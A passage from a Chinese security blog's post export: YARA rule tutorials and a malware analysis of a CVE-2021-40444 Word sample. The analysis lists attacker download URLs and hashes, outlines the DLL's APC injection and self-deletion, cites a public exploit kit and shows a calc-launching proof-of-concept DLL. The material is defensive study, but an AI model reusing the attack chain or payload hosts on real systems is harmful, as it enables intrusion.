6.释放出恶意代码的目的是什么？会从指定的域名中下载一些资源，来进行更新，而windows本身的wupdmgr.exe被转移到temp目录下，在持久化驻留的同时，也不影响原程序的运行。","categories":[{"name":"恶意代码分析实战","slug":"恶意代码分析实战","permalink":"https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Lab","slug":"Lab","permalink":"https://b1ackie.cn/tags/Lab/"}]},{"title":"yara规则学习笔记（三）","slug":"yara规则学习笔记（三）","date":"2021-09-22T07:31:15.000Z","updated":"2021-09-26T10:14:05.070Z","comments":true,"path":"2021/09/22/yara规则学习笔记（三）/","link":"","permalink":"https://b1ackie.cn/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"","text":"前言基本的一些语法，规则的应用基本已经学习完了，现在来练习一下模块的用法，主要先是PE这个模块，具体的每一个值的用法在官方文档中已经描述的非常详细了，我就不再过多的去介绍其用法了，我只是拿过来部分去进行实际的编写测试。在本篇之前，应该至少要对PE文件结构有了解，如果对PE还不是非常的了解的话，建议先去学习PE结构。 官方文档PE模块地址： https://yara.readthedocs.io/en/v4.1.2/modules/pe.html 之前的学习笔记 yara规则学习笔记（一） yara规则学习笔记（二） PE模块导入PE模块非常简单，加入 import “pe” 这样即可导入。 该模块中公布了PE结构中大部分存在的字段，并提供了可用于编写更加具有针对性的功能。 官方示例 12345678910111213141516171819202122232425import &quot;pe&quot;rule single_section&#123; condition: pe.number_of_sections == 1&#125;rule control_panel_applet&#123; condition: pe.exports(&quot;CPlApplet&quot;)&#125;rule is_dll&#123; condition: pe.characteristics &amp; pe.DLL&#125;rule is_pe&#123; condition: pe.is_pe&#125; 首先先编写一个弹窗的exe来进行测试，不进行任何的优化设置。 123456#include &lt;Windows.h&gt;int main()&#123; MessageBoxA(NULL, &quot;yara rule test&quot;, &quot;b1ackie!&quot;, NULL); return 0;&#125; machinemachine字段是运行平台，可以在编写时指定对应的值来判断运行平台，具体的值请去官方文档进行查看。 查看编写的测试文件的machine，可以看到是Intel386。 编写相应的规则 1234567import &quot;pe&quot;rule machine&#123; condition: pe.machine == pe.MACHINE_I386&#125; timestamp时间戳 在前面可以看到时间戳是6150116D 1234567import &quot;pe&quot;rule time&#123; condition: pe.timestamp == 0x6150116D&#125; size_of_optional_header可选头的大小 从前面的图片可以看到，可选头的大小是0xE0，编写规则。 1234567import &quot;pe&quot;rule size_of_optional_header&#123; condition: pe.size_of_optional_header == 0xE0&#125; size_of_code这是IMAGE_OPTIONAL_HEADER::SizeOfCode的值 1234567import &quot;pe&quot;rule size_of_code&#123; condition: pe.size_of_code == 0xE00&#125; entry_point入口点 使用OD打开测试程序，可以看到入口点处的代码十六进制值 E8 C5 03 00 00 123456789import &quot;pe&quot;rule test&#123; strings: $a = &#123;E8 C5 03 00 00&#125; condition: $a at pe.entry_point&#125; entry_point_raw入口点的地址 查看入口点地址 1234567import &quot;pe&quot;rule test&#123; condition: pe.entry_point_raw == 0x126C&#125; base_of_codeIMAGE_OPTIONAL_HEADER::BaseOfCode 的值 base_of_dataIMAGE_OPTIONAL_HEADER::BaseOfData 的值 image_baseIMAGE_OPTIONAL_HEADER::ImageBase 的值 现在来一起测试一下，查看示例程序这三项的值 123456789import &quot;pe&quot;rule test&#123; condition: pe.base_of_code == 0x1000 and pe.base_of_data == 0x2000 and pe.image_base == 0x400000&#125; data.directories数据目录表中的IMAGE_DATA_DIRECTORY结构信息，RVA和SIZE。具体的字段参考官方文档。 这里用导入表（IMAGE_DIRECTORY_ENTRY_IMPORT）来做测试，查看示例程序的导入表的RVA和size 12345678910111213import &quot;pe&quot;rule test&#123; condition: pe.data_directories [pe.IMAGE_DIRECTORY_ENTRY_IMPORT].virtual_address == 0x2594 and pe.data_directories [pe.IMAGE_DIRECTORY_ENTRY_IMPORT].size == 0xb4&#125; number_of_sectionspe文件中的节的数量 1234567import &quot;pe&quot;rule test&#123; condition: pe.number_of_sections == 5&#125; sectionsPE文件中的节的信息，PE 的每个部分对应一个。可以使用 [] 运算符访问各个部分。具体的信息可以去官方文档进行查看。这里介绍部分。 name，名称 virtual_address，虚拟地址 virtual_size，虚拟大小 raw_data_offset，raw地址 raw_data_size，raw大小 查看示例程序这几项的数据 1234567891011import &quot;pe&quot;rule test&#123; condition: pe.sections[0].name == &quot;.text&quot; and pe.sections[0].virtual_address == 0x1000 and pe.sections[0].virtual_size == 0xca1 and pe.sections[0].raw_data_offset == 0x400 and pe.sections[0].raw_data_size == 0xe00&#125; resources一个从0开始的资源对象数组，PE拥有的每个资源对应一个。可以使用[]访问单个资源。每个资源对象具有以下属性： rva 资源数据的RVA offset 资源数据偏移量 length 资源数据的长度 type 资源类型（整数） id 资源的ID（整数） language 资源的语言（整数） type_string 资源类型为字符串 name_string 字符串的资源名称 language_string 字符串的资源语言 根据PE结构的资源部分可以知道，资源节是树状的结构，一层一层，而第一层就是资源类型，第二层是资源ID，第三层是资源语言，然后之后是具体的数据，具体这部分可以去学习一下PE结构。 看下示例文件的资源结构，如图可以看到这三项分别是24、1、1033。 123456789import &quot;pe&quot;rule test&#123; condition: pe.resources[0].type == 24 and pe.resources[0].id == 1 and pe.resources[0].language == 1033 and pe.resources[0].length == 0x17D&#125; 再拿一个别的文件来进行测试，可以看到其资源类型是字符串类型“MYRES” 12345678910import &quot;pe&quot;rule test&#123; condition: pe.resources[0].type_string == &quot;M\\x00Y\\x00R\\x00E\\x00S\\x00&quot; and pe.resources[0].id == 102 and pe.resources[0].language == 2052&#125; 再测试一个文件，看到资源类型和资源ID都是字符串。 12345678910import &quot;pe&quot;rule test&#123; condition: pe.resources[0].type_string == &quot;U\\x00N\\x00I\\x00C\\x00O\\x00D\\x00E\\x00&quot; and pe.resources[0].name_string == &quot;L\\x00O\\x00C\\x00A\\x00L\\x00I\\x00Z\\x00A\\x00T\\x00I\\x00O\\x00N\\x00&quot; and pe.resources[0].language == 0&#125; pdb_pathpdb文件的路径 查看示例程序的PDB路径 123456import &quot;pe&quot;rule test&#123; condition: pe.pdb_path == &quot;D:\\\\programing\\\\something\\\\YaraRule_Test\\\\Release\\\\YaraRule_Test.pdb&quot;&#125; exportsPE文件导出的函数名，可以使用函数名也可以使用序号。 测试一下user32.dll，我们知道这个DLL会导出函数MessageBoxA 123456import &quot;pe&quot;rule test&#123; condition: pe.exports(&quot;MessageBoxA&quot;)&#125; imports如果一个PE文件从某DLL中导入了某个函数，则函数会返回TRUE，否则返回FALSE。我们的测试程序调用了MessageBoxA，这个函数是从user32.dll中导入的。也可以使用序号，也可以只是dll名称，具体用法还有很多，请查看官方文档。 123456import &quot;pe&quot;rule test&#123; condition: pe.imports(&quot;user32.dll&quot;,&quot;MessageBoxA&quot;) &#125; is_pe如果文件是PE文件，返回true is_dll()如果是DLL文件，返回true is_32bit()如果PE文件是32位的，返回true is_64bit()如果PE文件是64位，返回true 123456789101112131415161718192021import &quot;pe&quot;rule ispe&#123; condition: pe.is_pe&#125;rule isdll&#123; condition: pe.is_dll()&#125;rule is32&#123; condition: pe.is_32bit()&#125;rule is64&#123; condition: pe.is_64bit()&#125;","categories":[{"name":"YARA","slug":"YARA","permalink":"https://b1ackie.cn/categories/YARA/"}],"tags":[{"name":"YARA","slug":"YARA","permalink":"https://b1ackie.cn/tags/YARA/"},{"name":"恶意代码检测","slug":"恶意代码检测","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/"}]},{"title":"CVE-2021-40444的样本分析","slug":"CVE-2021-40444的样本分析","date":"2021-09-22T03:23:17.000Z","updated":"2021-09-22T03:26:51.157Z","comments":true,"path":"2021/09/22/CVE-2021-40444的样本分析/","link":"","permalink":"https://b1ackie.cn/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/","excerpt":"","text":"前言前段时间微软披露了cve-2021-40444，紧随其后就有大量的样本利用了此漏洞，本篇来分析一下一个利用了此漏洞的样本。 样本信息 样本名称：A Letter before court 4.docx 样本大小：24177字节 样本类型：TrojanDownloader、exploit、cve-2021-40444 MD5：1d2094ce85d66878ee079185e2761beb SHA1：53b31e513d8e23e30b7f133d4504ca7429f0e1fe SHA256：938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52 样本行为 打开文档尝试访问http://hidusi.com/e8c76295a5f9acb7 ，并下载side.html。 side.html内部包含混淆过的JS代码来利用 CVE-2021-40444漏洞来进行攻击。 side.html访问http://hidusi.com/e8c76295a5f9acb7/ministry.cab ，ministry.cab中包含着一个inf文件，实际上这是一个dll文件。 将cab中的Champion.inf文件保存在电脑上的若干路径。 执行Champion.inf，它会进行APC注入，注入进程为wabmig.exe，然后启动powershell进程实现自删除。 详细分析打开文档会比较慢，可以看到提示正在从服务器下载side.html文件。 将DOCX格式改为压缩包格式进行解压缩，在文件内找到\\word\\_rels下的document.xml.rels文件，当存在需要下载的内容时，里面会存放地址。 可以看到请求下载的地址。 打开side.html文件，里面是混淆过得JS代码，这部分JS代码利用了漏洞来进行攻击。本篇不讨论具体的漏洞攻击详情，只涉及到样本的分析。 https://github.com/lockedbyte/CVE-2021-40444，在这里找到了网上的作者解开了混淆后的JS代码，可以看到其访问获取cab的路径，然后会通过执行cpl命令去执行一个inf文件。 因为域名已经挂了，所以尝试自己复现一下漏洞，还原整个攻击流程。https://github.com/lockedbyte/CVE-2021-40444，在这里有已经编写好的EXP，可以直接利用。 自己编写一个DLL，来弹出计算器。 1234567891011121314151617181920// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: WinExec(&quot;calc.exe&quot;, SW_SHOW);//弹出计算器 break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 编译，指定自己的DLL文件和服务器地址。然后会在out目录下生成一个DOC文档。 在测试机打开文档，弹出计算器，效果如下 通过火绒剑监控行为，可以看到样本通过rundll32执行了命令，msword.inf就是样本中的championship.inf只是名字不同。 在指定目录下生成的inf文件 现在分析一下championship文件，前部分有大量的复杂代码，通过fakenet判断它会尝试访问macuwf.com/get_load，因为域名已经挂了，猜测里面可能是shellcode的资源。 然后会获取一些函数的地址 通过WMI接口来创建进程 遍历线程 如果没有SeDebugPrivilege会尝试提权 写内存 APC注入 最后会启动powershell删除自身 实际注入的shellcode，并没有任何意义且只有二十个字节左右，猜测是访问服务器进行下载的，因为服务器已经挂了，部分无法分析。 防范建议 及时更新安全补丁 禁用ActiveX控件 将以下内容复制到文本文档中，保存为.reg文件并且执行 1234567891011121314151617Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003 不要轻易打开未知来源的OFFICE文件。 IOCSMD5：1d2094ce85d66878ee079185e2761beb 4c80dc9fb7483214b1613957aae57e2a faf0a0b2e0d987fd487c63f6495a9fa4 e770385f9a743ad4098f510166699305 URL：http://hidusi.com/e8c76295a5f9acb7/side.html http://hidusi.com/e8c76295a5f9acb7/ministry.cab http://macuwf.com http://macuwf.com/get_load 参考连接https://paper.seebug.org/1718/ https://github.com/lockedbyte/CVE-2021-40444 https://www.trendmicro.com/en_no/research/21/i/remote-code-execution-zero-day--cve-2021-40444--hits-windows--tr.html https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"CVE-2021-40444","slug":"CVE-2021-40444","permalink":"https://b1ackie.cn/tags/CVE-2021-40444/"}]},{"title":"yara规则学习笔记（二）","slug":"yara规则学习笔记（二）","date":"2021-09-14T08:38:17.000Z","updated":"2021-09-22T08:18:54.826Z","comments":true,"path":"2021/09/14/yara规则学习笔记（二）/","link":"","permalink":"https://b1ackie.cn/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"上一篇地址 yara规则学习笔记（一） 条件可以使用and,or以及not等来进行布尔运算，关系运算符&gt;=,&lt;=,&lt;,&gt;,==和!=，算数运算符+,-,*,\\,%，，按位运算符&amp;,|,&lt;&lt;,&gt;&gt;,~,^。 字符串标识符也可以在条件中使用，充当布尔变量，其值取决于文件中相关字符串的存在与否。 12345678910rule test&#123; strings: $a = &quot;asd&quot; $b = &quot;123&quot; $c = &quot;zxc&quot; $d = &quot;987&quot; condition: ($a or $b) and ($c or $d)&#125; 上述规则，$a或者$b的任何字符串命中以及同时$c或者$d命中就是满足条件。 计数字符串有时候不仅仅需要知道某个字符串是否存在，还需要知道该字符串在文件或者进程内存中出现了多少次。每个字符串出现的次数由一个变量表示，该变量的名称是字符串标识符，用#字符代替了$字符。 12345678rule test&#123; strings: $a = &quot;test&quot; $b = &quot;123&quot; condition: #a == 6 and #b &lt; 3&#125; 当a字符串刚好出现了六次，且b字符串出现次数小于三次。 字符串偏移或虚拟地址有些情况下，我们需要知道字符串是否在某个特定的偏移量文件或者进程地址空间内的某个虚拟地址，这种时候就可以使用at操作符。 12345678rule test&#123; strings: $a = &quot;test&quot; $b = &quot;123&quot; condition: $a at 0xA and $b at 0x10&#125; 上述规则是“test”在文件偏移为0xA或者是进程在虚拟地址0xA的地方，”123”同理 at是指定具体的地址，而使用in可以指定一个范围 12345678rule test&#123; strings: $a = &quot;test&quot; $b = &quot;123&quot; condition: $a in (0..10) and $b in (10..filesize)&#125; 这条规则是a字符串在偏移为0-10的地方且b字符串在10-文件末尾的地方。 如果把123在文件的开头，test在偏移10以后的位置，那么就无法检出了。 交换一下位置即可检出 匹配长度在实际测试中，并不能成功，暂时还不知道为什么，先留个坑，等搞明白再写。 文件大小字符串标识符并不是唯一可以出现在条件中的变量（规则可以在没有任何字符串定义的情况下定义），还有一些其他的特殊变量可以使用，其中之一是filesize，就是文件大小，大小以字节表示。 12345rule testFileSize&#123; condition: filesize &gt; 5KB&#125; 这条规则只命中5KB以上大小的文件 示例中后缀使用的是KB，还可以使用MB 可执行入口点还有一个特殊变量是entrypoint，但是现在已经弃用了，3.0版本之后都使用pe.entry_point来代替了，请注意。 关于入口点，不同编译器的入口点可能略有不同，需要自己进行分析之后再编写规则。 我的测试用程序是使用VS2019进行编译的。可以看到版本是14.29 使用调试器打开，可以看到入口点，查看其十六进制数据可以看到是E8 C5030000 编写规则 12345678import &quot;pe&quot;rule EntryPoint&#123; strings: $a = &#123;E8 C5 03 00 00&#125; condition: $a at pe.entry_point&#125; 成功检出 访问指定位置的数据在多数情况下，需要检测特定文件偏移量或者虚拟内存地址的数据，可以从以下的函数之一来从给定的偏移量读取数据 123456789101112131415int8(&lt;offset or virtual address&gt;)int16(&lt;offset or virtual address&gt;)int32(&lt;offset or virtual address&gt;)uint8(&lt;offset or virtual address&gt;)uint16(&lt;offset or virtual address&gt;)uint32(&lt;offset or virtual address&gt;)int8be(&lt;offset or virtual address&gt;)int16be(&lt;offset or virtual address&gt;)int32be(&lt;offset or virtual address&gt;)uint8be(&lt;offset or virtual address&gt;)uint16be(&lt;offset or virtual address&gt;)uint32be(&lt;offset or virtual address&gt;) int是读取8,16,32位有符号整数，uint是读取无符号整数，默认都是小端序，如果要读取大端序，在后面加上be 现在来尝试编写一个检测是否是PE文件的规则，我们知道PE开头都是“MZ”，0x5A4D，然后在DOS头部的e_lfanew标识的是PE标志的偏移量，这个地址相对于MZ头偏移量是0x3C。PE标志是“PE”，0x4550，现在可以尝试编写规则。他们俩就可以标识着此文件是否是一个PE文件。 12345678rule IsPe&#123; condition: //MZ,word类型 uint16(0) == 0x5A4D //e_lfanew-&gt;pe Signature &quot;PE&quot;,dword类型 and uint32(uint32(0x3C)) == 0x00004550&#125; 字符串集在某些情况下，需要在条件中指定，至少存在多少字符串命中才符合要求，此时可以使用of 123456789rule test&#123; strings: $a = &quot;test1&quot; $b = &quot;test2&quot; $c = &quot;test3&quot; condition: 2 of ($a,$b,$c)&#125; 这条规则要求，$a,$b,$c至少存在两个才行，任意组合都可以。 在集合中也是可以使用通配符的。 123456789rule test&#123; strings: $test1 = &quot;test1&quot; $test2 = &quot;test2&quot; $test3 = &quot;test3&quot; condition: 2 of ($test*)&#125; 也可以使用$*来表示规则中所有的字符串，也可以使用them 12345678910111213141516171819rule test1&#123; strings: $test1 = &quot;test1&quot; $test2 = &quot;test2&quot; $test3 = &quot;test3&quot; condition: 2 of ($*)&#125;rule test2&#123; strings: $test1 = &quot;test1&quot; $test2 = &quot;test2&quot; $test3 = &quot;test3&quot; condition: 1 of them&#125; 在上面的示例中都使用了数字常量指定条件的字符串，也可以使用其他的表达式，any和all all of them //所有规则中包含的字符串 any of them //任意字符串组合都可以，至少为一条 对多个字符串应用相同条件还有一个功能强大的运算符for..of，可以对多个字符串匹配相同的条件，语法是这样的： for a of b : (c) 在b字符串集合中，至少有a个字符串满足c的条件。 下面举一些例子 123456789import &quot;pe&quot;rule test&#123; strings: $a = &#123;E8 C5 03 00 00&#125; $b = &#123;E8 01 00 00 00&#125; condition: for any of ($a,$b) : ($ at pe.entry_point)&#125; 上述规则，是在a,b两个字符串集合中，至少有一个满足于pe.entry_point相同的条件。 123456789rule test&#123; strings: $a = &quot;test1&quot; $b = &quot;test2&quot; $c = &quot;test3&quot; condition: for any of them : (# &gt; 2)&#125; 上述规则，abc这三个字符串，任意组合只要出现超过两次就可以，至少是一组。 使用匿名字符串当使用of，for..of，指定了them时，分配给规则中的每个字符串的标识符通常是多余的，因为并没有单独的引用某个具体的字符串，所以可以不需要为每个字符串都提供标识符。在这些情况下，可以只使用仅有$字符组成的标识符声明匿名字符串 12345678rule test&#123; strings: $ = &quot;test1&quot; $ = &quot;test2&quot; condition: any of them&#125; 迭代字符串yara也可以写一个类似于C的FOR循环，语法是for..of 如下示例，可以检索所有PE文件中的区段，区段名为text的会命中规则。 123456import &quot;pe&quot;rule test &#123; condition: for any section in pe.sections : (section.name == &quot;.text&quot;)&#125; 比如现在可以来检测是否存在UPX壳，UPX加壳后，会有一个区段是UPX，图为UPX3.96版本加壳后的区段信息。 123456import &quot;pe&quot;rule test &#123; condition: for any section in pe.sections : (section.name == &quot;UPX0&quot;) &#125; b在文件中前三次出现的位置偏移必须比a多7。 12345678rule test &#123; strings: $a = &quot;test1&quot; $b = &quot;test2&quot; condition: for all i in (1,2,3) : (@a[i] + 7 == @b[i])&#125; 引用其他规则在编写规则之前，还可以使用类似函数调用的方式，引用之前定义的规则。 123456789101112131415rule test1&#123; strings: $a = &quot;test1&quot; condition: $a&#125;rule test2&#123; strings: $a = &quot;test2&quot; condition: $a and test1&#125; 全局规则全局规则可以一次对所有的规则进行限制，比如想要限制文件的大小，可以定义一条全局规则来进行限制，而不用单独在每个规则中都进行大小限制。 12345global rule sizelimit&#123; condition: filesize &lt; 100KB&#125; 私有规则私有规则只是在匹配给定的文件时，yara不会报告的规则，当一个规则引用了另一个规则时，可以使用私有规则来让它不要报告。 123456789101112131415rule test1&#123; strings: $a = &quot;test1&quot; condition: $a&#125;rule test2&#123; strings: $a = &quot;test2&quot; condition: $a and test1&#125; 看到结果只报告了test2，没有报告test1，正常情况是要报告的。 规则标签yara可以向规则添加标签。这些标签用于过滤yara的输出并且只显示感兴趣的规则。 123456789101112131415rule test1 : test&#123; strings: $a = &quot;test1&quot; condition: $a&#125;rule test2 : b1ackie&#123; strings: $a = &quot;test2&quot; condition: $a and test1&#125; 元数据除去字符串定义和条件部分，规则还可以有一个元数据部分，可以在其中放置有关规则的其他信息。元数据部分使用关键字meta。 123456789101112131415rule test1 : test&#123; strings: $a = &quot;test1&quot; condition: $a&#125;rule test2 : b1ackie&#123; strings: $a = &quot;test2&quot; condition: $a and test1&#125; 模块的使用模块是yara核心功能的扩展，一些模块，比如PE，Cuckoo是由yara官方发布的，其他模块可以由第三方创建。使用模块的第一步是使用import导入它。 import “pe” 搭配如模块后，可以使用其功能，用法是modulename.func比如 pe.entry_point pe.sections 外部变量外部变量允许定义依赖于外部提供的值得规则。 12345rule ExternalVariableExample1&#123; condition: ext_var == 10&#125; 这种情况下ext_var是一个外部变量，通过-d参数来指定。 外部变量可以是这些类型：整数、字符串或布尔值。它们的类型取决于分配给它们的值。整数变量可以替代条件中的任何整数常量，布尔常量可以占据布尔表达式的位置。 12345rule ExternalVariableExample2&#123; condition: bool_ext_var or filesize &lt; int_ext_var&#125; 字符串常量可以与这些运算符一起使用， contains：如果字符串包含指定的子字符串，返回true matches：如果字符串匹配给定的正则表达式时，返回true 12345678910rule ContainsExample&#123; condition: string_ext_var contains &quot;text&quot;&#125;rule MatchesExample&#123; condition: string_ext_var matches /[a-z]+/&#125; 包含文件yara提供了include指令，它可以将其他规则文件包含到当前文件中。 include “other.yar” 相对路径 include “./test/other.yar” include “../test/other.yar” 绝对路径 include “C:/test/other.yar” 参考https://yara.readthedocs.io/en/v4.1.2/index.html https://www.cnblogs.com/SunsetR/p/12650325.html#autoid-3-2-0","categories":[{"name":"YARA","slug":"YARA","permalink":"https://b1ackie.cn/categories/YARA/"}],"tags":[{"name":"YARA","slug":"YARA","permalink":"https://b1ackie.cn/tags/YARA/"},{"name":"恶意代码检测","slug":"恶意代码检测","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/"}]},{"title":"yara规则学习笔记（一）","slug":"yara规则学习笔记（一）","date":"2021-09-13T07:06:57.000Z","updated":"2021-09-23T02:00:10.528Z","comments":true,"path":"2021/09/13/yara规则学习笔记（一）/","link":"","permalink":"https://b1ackie.cn/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"前言yara是一种皆在帮助恶意软件研究人员识别和分类恶意软件样本的工具。每一个描述，也就是规则，由一组字符串和一个确定其逻辑布尔表达式组成。 官方文档地址： https://yara.readthedocs.io/en/v4.1.2/index.html windows端官方下载地址： https://github.com/VirusTotal/yara/releases/tag/v4.1.2 安装安装非常的简单，在windows下，可以直接访问https://github.com/VirusTotal/yara/releases/tag/v4.1.2来进行下载 下载解压之后就可以直接使用了，输入参数–help可以看到所有yara的参数。 中文翻译 123456789101112131415161718192021-t --tag=tag只打印标记为tag的规则-i --identifier=identifier只打印名为identifier的规则-n --negate只打印不满足的规则（negate）-D --打印模块数据打印模块数据-g --打印标签打印标签-m --打印元数据-s --打印字符串打印匹配的字符串-L --打印字符串长度打印匹配字符串的长度-e --打印命名空间打印规则的命名空间-p --threads=NUMBER使用指定的线程数扫描目录-l --max rules=NUMBER匹配多个规则后中止扫描-d VAR=值定义外部变量-x MODULE=文件将文件内容作为额外数据传递到模块-a --timeout=秒在给定秒数后中止扫描-k --堆栈大小=插槽设置的最大堆栈大小（默认值=16384）-r --递归递归搜索目录-f ——快速扫描快速匹配模式-w --无警告禁用警告 --警告失败警告失败-v --版本显示版本信息-h --help显示此帮助并退出 编写yara规则yara规则的语法类似于C语言，易于编写和理解，下面是官方给出的示例 12345678910111213rule silent_banker : banker&#123; meta: description = &quot;This is just an example&quot; thread_level = 3 in_the_wild = true strings: $a = &#123;6A 40 68 00 30 00 00 6A 14 8D 91&#125; $b = &#123;8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9&#125; $c = &quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot; condition: $a or $b or $c&#125; meta是一些描述信息， strings定义了一些十六进制值和一个字符串 condition定义了匹配的条件，a,b,c三个条件任意一个都会被认定为是silent_banker : banker 下面来进行一下简单的测试。 创建一个文件写入字符串，再创建一个文件写入$a的十六进制值。 将它们放在test file文件夹下，进行检测，可以看到规则成功命中 yara的每条规则都以关键字rule开头，后面跟规则标识符。标识符必须遵循与C编程语言相同的词汇约定，它们可以包含任何字母数字字符和下划线字符串，但是第一个字符不能是数字，规则标识符是区分大小写的，不可以超过128个字符。以下关键字是保留的，不能用作标识符： all and any ascii at base64 base64wide condition contains endswith entrypoint false filesize for fullword global import icontains iendswith in include int16 int16be int32 int32be int8 int8be istartwith matches meta nocase not of or private rule startswith strings them true uint16 uint16be uint32 uint32be uint8 uint8be wide xor 规则部分通常是由两部分组成：字符串定义和条件。如果规则不依赖于任何字符串，则可以省略字符串定义部分，但始终需要条件部分。字符串定义部分是定义成为规则一部分的字符串的地方。每个字符串都有一个标识符，由$字符后跟一系列字母数字字符和下划线组成，这些标识符可以用于条件部分以引用相应的字符串。字符串可以以文本或者十六进制形式定义，如下所示： 12345678rule test&#123; strings: $test_string=&quot;this is a test&quot; $test_hex_value=&#123;11 22 33 44&#125; condition: $test_string or $test_hex_value&#125; 文本字符串用双引号括起来，像在C语言中一样，十六进制数字用大括号括起来。 条件部分是规则逻辑所在。该部分必须包含一个布尔表达式，说明在何种情况下文件或者进程满足规则。通常。条件将通过使用它们的标识符来引用先前定义的字符串。在这种情况下，字符串标识符充当布尔变量，如果在文件或者进程内存中找到字符串，则该变量评估为真，否则为假。 注释可以向规则中添加注释，像C一样，支持单行和多行注释。 123456789101112131415rule test&#123; //这是单行注释 strings: $test_string=&quot;this is a test&quot; $test_hex_value=&#123;11 22 33 44&#125; /* 这是一个 多行注释 */ condition: $test_string or $test_hex_value&#125; 字符串yara中有三种类型的字符串：十六进制字符串、文本字符串和正则表达式。十六进制字符串用于定义原始字节序列，而文本字符串和正则表达式用于定义清晰文本的部分。然而，文本字符串和正则表达式也可用于转义序列来表示原始字节。 十六进制字符串十六进制字符串允许三种特殊结构，使其更加灵活：通配符、跳转和替代。通配符只是一个占位符，表明某些字节是未知的，它们可以匹配任何内容。占位符是（?）。示例如下： 1234567rule WildcardTest&#123; strings: $a = &#123;31 32 33 34 ?? 36 3? 38 39&#125; condition: $a&#125; 现在向test文件内写入“123456789”这段字符串，可以成功检测。 通配符在你知道字符串的可变块长度时很有用，然而，有时情况不是这样。某些情况下，可能需要定义具有可变内容和长度的块的字符串。在这些情况下可以使用跳转。 1234567rule JumpTest&#123; strings: $a = &#123;31 [0-7] 39&#125; condition: $a&#125; 还是继续测试刚才的文件，可以看到成功检测到，提示了一个warning意思是可能会拖慢扫描速度，主要是规则编写的不到位，不够精准。 在上面的例子中，用方括号括起来0-7，这就是一个跳转，意思是任何0-7个字节的任意序列都可以占据此位置，比如这些字符都是可以匹配到当前规则的。 123456789 1xx9 19 1asdasd9 任何跳转的条件[X-Y]都必须满足Y&gt;X的条件，如下是无效的 31 32 [10-2] 39 如果上下限相等，也就是说要匹配的数字的长度是固定的，可以写一个括在括号里的数字，如下所示 31 32 33 [2] 36 其等价于： 31 32 33 [2-2] 36 31 32 33 ?? ?? 36 从yara2.0开始还有无界跳转 31 32 [10-] 39 31 32 [-] 39 第一个的意思是10-无限，第二个意思是无限。 在某些情况下，可以使用正则表达式的语法 1234567rule Test&#123; strings: $a = &#123;31 32 (33 34 | 36 37) 39&#125; condition: $a&#125; 此规则将会匹配12349和12679 也可以将通配符结合起来，如下： 1234567rule Test&#123; strings: $a = &#123;31 32 (33 34 | 36 37 | 41 ?? 4?) 39&#125; condition: $a&#125; 此时如果有一个字符串12A0G9的字符串也可以被检测到（这只是其中之一，可以根据条件自行构建字符串，并不是唯一的）。 文本字符串文本字符串都是这样定义的 12345678rule Test&#123; strings: $a = &quot;this is a test&quot; condition: $a&#125; 这是最简单的情况：ASCII编码、区分大小写。文本字符串还可以包含以下C语言中可用的转义字符： \\“ 双引号 \\\\ 反斜杠 \\r 回车 \\t 水平标签 \\n 回车换行 \\xdd 十六进制表示 文本字符串还可以附带一些有用的修饰符，这些修饰符可以改变字符串的解释方式。这些修饰符附加在由空格分隔的字符串定义的末尾。 不区分大小写yara中默认文本字符串是区分大小写的，但是可以通过在字符串定义的末尾附加修饰符nocase将字符串转换为不区分大小写的模式。 12345678rule Test&#123; strings: $a = &quot;this is a test&quot; nocase condition: 